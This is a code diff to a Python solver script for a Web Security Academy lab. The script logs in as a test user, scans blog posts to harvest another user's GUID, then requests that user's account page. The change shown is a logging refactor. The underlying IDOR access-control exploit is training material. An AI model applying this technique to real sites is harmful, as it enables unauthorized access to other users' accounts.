@@ -1,4 +1,4 @@
-from web_security_academy.core.logger import logger
+from web_security_academy.core.logger import logger, NoNewline
 from urllib.parse import urlencode
 from bs4 import BeautifulSoup
 
@@ -9,25 +9,23 @@ def solve_lab(session):
     session.login("wiener", "peter")
 
     logger.info("Attempting to find blog post written by carlos...")
-    logger.toggle_newline()
-    for i in range(1, 11):
-        params = {"postId": i}
-        resp = session.get_path("/post", params=params)
+    with NoNewline():
+        for i in range(1, 11):
+            params = {"postId": i}
+            resp = session.get_path("/post", params=params)
 
-        soup = BeautifulSoup(resp.text, "lxml")
-        elem = soup.select_one("#blog-author a")
-        author = elem.text
+            soup = BeautifulSoup(resp.text, "lxml")
+            elem = soup.select_one("#blog-author a")
+            author = elem.text
 
-        if author != "carlos":
-            logger.info(f"Post #{i} by {author}")
+            if author != "carlos":
+                logger.info(f"Post #{i} by {author}")
+            else:
+                guid = elem.get("href").replace("/blogs?userId=", "")
+                logger.success(f"Post #{i} by {author} (extracted GUID {guid})")
+                break
         else:
-            guid = elem.get("href").replace("/blogs?userId=", "")
-            logger.success(f"Post #{i} by {author} (extracted GUID {guid})")
-            logger.toggle_newline()
-            break
-    else:
-        logger.failure("Unable to find blog post written by carlos.")
-        logger.toggle_newline()
+            logger.failure("Unable to find blog post written by carlos.")
 
     params = {"id": guid}
     logger.info(f'Visiting "{session.url}my-account?{urlencode(params)}"...')
